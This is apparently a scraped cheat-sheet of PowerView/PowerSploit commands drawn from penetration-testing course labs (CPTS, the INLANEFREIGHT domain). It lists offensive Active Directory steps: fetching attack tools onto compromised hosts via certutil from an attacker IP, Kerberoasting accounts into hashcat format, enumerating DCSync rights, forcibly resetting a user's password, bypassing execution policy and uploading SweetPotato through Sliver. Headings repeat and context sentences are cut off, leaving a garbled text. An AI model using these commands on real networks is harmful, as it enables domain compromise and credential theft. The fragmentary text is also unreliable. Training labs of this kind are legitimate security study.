# PowerView / PowerSploit

% powerview, powersploit, cpts

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - file-download
#cat/RECON #cpts
```
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - file-download-2
#cat/RECON #cpts
```
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - powershell-invoke-webrequest
#cat/RECON #cpts
```
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - common-erros-with-powershell
#cat/RECON #cpts
```
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - powerview
#cat/RECON #cpts
```
PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - domain-user-information
#cat/RECON #cpts
```
name : Matthew Morgan
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - finding-users-with-spn-set
#cat/RECON #cpts
```
serviceprincipalname samaccountname
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - sharpview
#cat/RECON #cpts
PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their [Empire 4 ](https://github.com/BC-SECURITY/Empire/blob/master/empire/s

```
Get_DomainUser -Identity <string> -DistinguishedName <string> -SamAccountName <string> -Name <string> -MemberDistinguishedName <string> -MemberName <string> -SPN <bool> -AdminCount <bool> -AllowDelegation <bool> -DisallowDelegation <bool> -TrustedToAuth <bool> -PreauthNotRequired <bool> -KerberosPreauthNotRequired <bool> -NoPreauth <bool> -Domain <string> -LDAPFilter <string> -Filter <string> -Properties <string> -SearchBase <string> -ADSPath <string> -Server <string> -DomainController <string> -SearchScope <scope> -ResultPageSize <int> -ServerTime
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - sharpview-2
#cat/RECON #cpts
Here we can use SharpView to enumerate information about a specific user, such as the user forend, which we control.

```
[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - automated-tool-based-route
#cat/RECON #cpts
Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the

```
samaccountname
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - using-powerview-to-target-a-specific-user
#cat/RECON #cpts
```
SamAccountName : sqldev
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - a-note-on-encryption-types
#cat/RECON #cpts
Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-suppo

```
serviceprincipalname msds-supportedencryptiontypes samaccountname
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - investigating-the-help-desk-level-1-group-with-get-domaingroup
#cat/RECON #cpts
ACL Enumeration

```
memberof
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - changing-the-users-password
#cat/RECON #cpts
ACL Abuse Tactics

```
VERBOSE: [Get-PrincipalContext] Using alternate credentials
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - finding-passwords-in-the-description-field-using-get-domain-user
#cat/RECON #cpts
Miscellaneous Misconfigurations

```
samaccountname description
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - checking-for-passwd_notreqd-setting-using-get-domainuser
#cat/RECON #cpts
Miscellaneous Misconfigurations

```
$725000-9jb50uejje9f ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - enumerating-for-dont_req_preauth-value-using-get-domainuser
#cat/RECON #cpts
Miscellaneous Misconfigurations

```
samaccountname : mmorgan
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - enumerating-gpo-names-with-powerview
#cat/RECON #cpts
Miscellaneous Misconfigurations

```
displayname
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - using-get-domainsid
#cat/RECON #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
S-1-5-21-2806153819-209893948-922872689
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - obtaining-enterprise-admins-groups-sid-using-get-domaingroup
#cat/RECON #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
distinguishedname objectsid
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - enumerating-the-mssqlsvc-account
#cat/RECON #cpts
Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

```
samaccountname memberof
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433
#cat/RECON #cpts
From the WEB01 `meterpreter`, students need to drop to a command shell and download `PowerView` using `certutil.exe`. Finally, students can import the module and search for domain users with SPNs; students will find `svc

```
cd C:\
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-2
#cat/RECON #cpts
From the WEB01 `meterpreter`, students need to drop to a command shell and download `PowerView` using `certutil.exe`. Finally, students can import the module and search for domain users with SPNs; students will find `svc

```
certutil.exe -f -urlcache -split http://PWNIP:PWNPO/PowerView.ps1 PowerView.ps1
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-3
#cat/RECON #cpts
From the WEB01 `meterpreter`, students need to drop to a command shell and download `PowerView` using `certutil.exe`. Finally, students can import the module and search for domain users with SPNs; students will find `svc

```
Import-Module .\PowerView.ps1
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-4
#cat/RECON #cpts
From the WEB01 `meterpreter`, students need to drop to a command shell and download `PowerView` using `certutil.exe`. Finally, students can import the module and search for domain users with SPNs; students will find `svc

```
Get-DomainUser * -SPN | select samaccountname
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-5
#cat/RECON #cpts
```
(Meterpreter 1)(C:\Windows\system32) > shell
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-6
#cat/RECON #cpts
```
(c) 2018 Microsoft Corporation. All rights reserved.
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-7
#cat/RECON #cpts
```
C:\>certutil.exe -f -urlcache -split http://10.10.14.13:8000/PowerView.ps1 PowerView.ps1
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-8
#cat/RECON #cpts
```
certutil.exe -f -urlcache -split http://10.10.14.13:8000/PowerView.ps1 PowerView.ps1
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-9
#cat/RECON #cpts
```
CertUtil: -URLCache command completed successfully.
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - crack-the-accounts-password-submit-the-cleartext-value
#cat/RECON #cpts
Using the previously established `meterpreter` session, students need to kerberoast the `svc_sql` account to obtain its hash:

```
Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - what-attack-can-this-user-perform
#cat/RECON #cpts
```
(Meterpreter 1)(C:\windows\system32\inetsrv) > shell
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - what-attack-can-this-user-perform-2
#cat/RECON #cpts
Then, students need to use `PowerView` to enumerate attack vectors for `tpetty`:

```
$sid = Convert-NameToSid tpetty
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - what-attack-can-this-user-perform-3
#cat/RECON #cpts
Then, students need to use `PowerView` to enumerate attack vectors for `tpetty`:

```
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit
#cat/RECON #cpts
Using the previously established RDP session on MS01, students can use the shared drive in File Explorer and transfer `PowerView.ps1` and `Kerbrute` to the Desktop: Students need to open PowerShell and navigate to `C:\Us

```
cd .\Desktop\
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-2
#cat/RECON #cpts
Using the previously established RDP session on MS01, students can use the shared drive in File Explorer and transfer `PowerView.ps1` and `Kerbrute` to the Desktop: Students need to open PowerShell and navigate to `C:\Us

```
Set-ExecutionPolicy Bypass -Scope Process
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-3
#cat/RECON #cpts
Using the previously established RDP session on MS01, students can use the shared drive in File Explorer and transfer `PowerView.ps1` and `Kerbrute` to the Desktop: Students need to open PowerShell and navigate to `C:\Us

```
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} | Set-Content adusers.txt
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-4
#cat/RECON #cpts
Using the previously established RDP session on MS01, students can use the shared drive in File Explorer and transfer `PowerView.ps1` and `Kerbrute` to the Desktop: Students need to open PowerShell and navigate to `C:\Us

```
Get-Content .\adusers.txt | select -First 10
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-5
#cat/RECON #cpts
```
Windows PowerShell
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - using-the-skills-learned-in-this-section-enumerate-the-activedirectory
#cat/RECON #cpts
When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Ad

```
cd C:\Tools\
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - find-another-user-with-the-passwd_notreqd-field-set-submit-the-samacco
#cat/RECON #cpts
Then, students need to use `Get-DomainUser` to enumerate users for the `PASSWD_NOTREQD` setting; students will find out that the `samaccountname` of the other user with the `passwd_notreqd` field set is `ygroce`:

```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - find-another-user-with-the-do-not-require-kerberos-pre-authentication-
#cat/RECON #cpts
Using the same `xfreerdp` connection established in the previous question, students need to use `Get-DomainUser` to enumerate users for the `Do not require Kerberos pre-authentication setting` setting; students will find

```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - find-another-user-with-the-do-not-require-kerberos-pre-authentication--2
#cat/RECON #cpts
```
samaccountname : ygroce
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - what-is-the-sid-of-the-child-domain
#cat/RECON #cpts
Students then need to run `Get-DomainSID` to find the `SID` `S-1-5-21-2806153819-209893948-922872689`:

```
Get-DomainSID
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - find-a-backup-script-that-contains-the-password-for-the-backupadm-user
#cat/RECON #cpts
Once downloaded successfully, students need to copy them over to the named share "home" using the `copy` command:

```
copy \\TSCLIENT\home\PowerView.ps1
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-2
#cat/RECON #cpts
```
cmd-session
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-3
#cat/RECON #cpts
Students now need to import the `PowerView` module and change the password of the `ssmalls` user (students should know about this user from the section's reading, as the data collected from `SharpHound` was analyzed with

```
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Pwned123' -AsPlainText -Force) -Verbose
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-4
#cat/RECON #cpts
```
C:\Share>powershell
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - flight
#cat/RECON #cpts
extrait du PDF Joplin: flight

```
cd "C:\users\public\music" sliver
```

## PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - PowerView / PowerSploit - flight-2
#cat/RECON #cpts
extrait du PDF Joplin: flight

```
upload /opt/SweetPotato.exe sliver
```

